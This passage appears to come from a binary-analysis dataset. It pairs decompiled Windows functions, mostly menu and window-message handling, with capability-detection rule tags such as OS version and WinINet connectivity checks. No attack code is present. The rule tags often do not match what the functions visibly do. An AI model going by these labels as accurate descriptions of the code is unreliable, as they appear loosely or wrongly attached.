        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __cdecl fcn.00457c24(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t **in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\x01';\n    iVar1 = (*in_EAX)[0x19];\n    if (iVar1 != 0) {\n        uStackY32 = 0x457c52;\n        var_1h._0_1_ = fcn.00457c24(arg_8h);\n    }\n    if ((var_1h != '\\0') && (var_1h != '\\x03')) {\n        if (var_1h == '\\x02') {\n            if ((*(arg_8h + -4) == 0) || (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6))) {\n                uVar2 = fcn.0045784c();\n                *(arg_8h + -4) = uVar2;\n                if (*(arg_8h + -4) == 0) {\n                    return '\\x03';\n                }\n            }\n            piVar3 = fcn.00457c14();\n            *in_EAX = piVar3;\n            if (*in_EAX == NULL) {\n                return '\\x02';\n            }\n            if ((*in_EAX)[0x19] != iVar1) {\n                return '\\x02';\n            }\n            if (in_EDX == 0) {\n                var_1h._0_1_ = '\\x01';\n            }\n        }\n        if (*(*in_EAX + 0x39) == '\\0') {\n            var_1h._0_1_ = '\\0';\n        }\n        else {\n            uStackY32 = 0x457d4a;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0) {\n                fcn.004568f4();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((*(arg_8h + -4) == 0) || ((*in_EAX != *(arg_8h + -4) && (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6)))))\n            {\n                var_1h._0_1_ = '\\x02';\n            }\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 655
    },
    "00457d78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00457d78(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    puStack36 = 0x457d8c;\n    cVar1 = fcn.00457b88();\n    if (cVar1 != '\\0') {\n        return 0;\n    }\n    puStack36 = 0x457d9b;\n    fcn.00457bc4();\n    puStack36 = 0x457db5;\n    fcn.0044db14();\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack40 = 0x457e4b;\n    puStack48 = 0x457dd5;\n    puStack36 = &stack0xfffffffc;\n    iVar2 = fcn.0045784c();\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = uStack44;\n        puStack36 = 0x457e52;\n        uStack40 = 0x457e4a;\n        uVar3 = fcn.0044db0c();\n        return uVar3;\n    }\n    puStack48 = 0x457deb;\n    fcn.0044db14();\n    uStack52 = 0x457e20;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00457c24(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x457e27;\n    uStack52 = 0x457e1f;\n    uVar3 = fcn.0044db0c();\n    return uVar3;\n}\n",
        "token_count": 457
    },
    "00457e74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457e74(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x457e9b;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.00458208();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.00458208();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "00457fdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00457fdc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.00457f30(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.004058fc();\n        iVar1 = fcn.0040a86c();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.004056dc();\n    return 1;\n}\n",
        "token_count": 174
    },
    "00458070": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458070(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x4a5178 + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x4580e4;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.004585e0();\n        }\n        else {\n            fcn.004585e0();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x4580eb;\n        uStack20 = 0x4580d9;\n        fcn.004585e0();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "004580f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004580f0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.00457fdc();\n    if ((*(*0x4a5178 + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.00458070();\n        }\n        else {\n            fcn.00458604();\n        }\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00458208": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00458208(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "004583bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004583bc(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.00458220(*(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.0045827c(*(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "00458538": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00458538(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.004579d0();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.0045784c();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.0045784c();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.0040a84c();\n            uVar4 = fcn.0040a764();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 278
    },
    "00458604": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458604(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.0045b9a4();\n        if (iVar1 != 0) {\n            fcn.004585e0();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0045862c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045862c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        fcn.004047f0();\n        fcn.004585e0();\n        *(in_EAX + 0x41) = 1;\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "004586c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004586c0(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x38) != 0) {\n        cVar1 = fcn.00457fdc();\n        if (in_ECX == 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (cVar1 != '\\0') {\n            sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.00458158(arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 173
    },
    "004587dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004587dc(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x458d10;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x45885a;\n                    fcn.00419610();\n                    puStack80 = 0x458863;\n                    cVar3 = fcn.004578ec();\n                    if (cVar3 != '\\0') goto code_r0x00458cfa;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x458a6e;\n                    fcn.00419610();\n                    puStack80 = 0x458a7b;\n                    iVar5 = fcn.0045784c();\n                    if (iVar5 != 0) {\n                        puStack80 = 0x458a94;\n                        fcn.00428554();\n                        puStack84 = 0x458b43;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(iVar9 + 0x18);\n                        puStack96 = 0x458ab1;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x458b26;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.00428be8();\n                        fcn.00428a7c();\n                        uVar8 = *(iVar9 + 0x10);\n                        puStack112 = 0x458afe;\n                        fcn.00458fd4(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x458b2d;\n                        uStack104 = 0x458b15;\n                        fcn.00428be8();\n                        puStack112 = 0x458b25;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x458b79;\n                    fcn.00419610();\n                    puStack80 = 0x458b86;\n                    piVar4 = fcn.0045784c();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x458b9f;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x458c86;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x458bbc;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.00428554();\n                        uStack100 = 0x458c61;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x458bd6;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x458c44;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.00428be8();\n                        fcn.00428a7c();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x458c4b;\n                        uStack120 = 0x458c36;\n                        fcn.00428be8();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x45896c;\n                    piVar4 = fcn.00419610();\n                    puStack80 = 0x458971;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x458983;\n                        iVar5 = fcn.00419610();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x458995;\n                        fcn.00419610();\n                        puStack80 = 0x4589a2;\n                        *NULL = fcn.0045784c();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x4589b9;\n                        fcn.00419610();\n                        puStack80 = 0x4589c6;\n                        iVar9 = fcn.0045787c();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x4589d4;\n                            fcn.00419610();\n                            puStack80 = 0x4589e1;\n                            fcn.0045787c();\n                        }\n                        if (*(**0x4a514c + 0x6c) != 0) {\n                            if ((*(*(**0x4a514c + 0x6c) + 0x270) & 8) == 0) {\n                                puStack80 = 0x458a3a;\n                                fcn.0047c8e4();\n                            }\n                            else {\n                                puStack80 = 0x458a27;\n                                fcn.0047c96c();\n                            }\n                        }\n                        goto code_r0x00458cfa;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x458890;\n                fcn.00419610();\n                puStack80 = 0x458898;\n                cVar3 = fcn.00457908();\n                if (cVar3 != '\\0') goto code_r0x00458cfa;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x4588dd;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x4588fc;\n                fcn.00419610();\n                puStack80 = 0x458908;\n                iVar10 = fcn.0045784c();\n                if (iVar10 != 0) {\n                    puStack80 = 0x45891f;\n                    fcn.0045bc58();\n                    puStack80 = 0x45892e;\n                    fcn.0047ccac();\n                    goto code_r0x00458cfa;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x458945;\n        fcn.0047ccac();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x458caf;\n                piVar4 = fcn.00419610();\n                puStack80 = 0x458cba;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x00458cd0:\n                    puStack80 = 0x458cda;\n                    fcn.004583bc();\n                    goto code_r0x00458cfa;\n                }\n                puStack80 = 0x458ccc;\n                iVar10 = fcn.0045784c();\n                if (iVar10 != 0) goto code_r0x00458cd0;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x458cf7;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x00458cfa:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x458d17;\n    uStack72 = 0x458d0f;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 2884
    },
    "00458d20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458d20(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 8) == 0) {\n        uVar1 = fcn.004207ec(fcn.00458790, in_EAX);\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.004194b8();\n    return;\n}\n",
        "token_count": 95
    },
    "00458d48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458d48(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00419754();\n    if (*(in_EAX + 8) == 0) {\n        fcn.004208a0();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00458e30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458e30(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (*(in_EAX + 0x41) != '\\0')) {\n        iVar1 = fcn.00453880();\n        if (iVar1 == 0) {\n            fcn.004585e0();\n            *(in_EAX + 0x41) = 1;\n        }\n        else {\n            fcn.004585e0();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00458e7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00458e7c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*(*0x4a5178 + 0xd) != '\\0') {\n        if (*(in_EAX + 0x41) == '\\0') {\n            uVar2 = *(in_EAX + 0x30) == '\\x01';\n        }\n        else {\n            iVar1 = fcn.00453880();\n            if (iVar1 == 0) {\n                uVar2 = fcn.0047b340();\n            }\n            else {\n                uVar2 = fcn.0040483c();\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "004693f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004693f0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.0046af98();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0045ba00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ba00(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0045b9a4();\n    if ((iVar1 == 0) && (*0x4aafea != 0)) {\n        (**0x4aafe8)();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0045bcf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0045bcf0(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.0045b9a4();\n    if (((iVar1 != 0) && (*0x4a4850 != 0)) && (iVar1 == *(*0x4a4850 + 0x30))) {\n        iVar1 = *0x4a4850;\n    }\n    return iVar1;\n}\n",
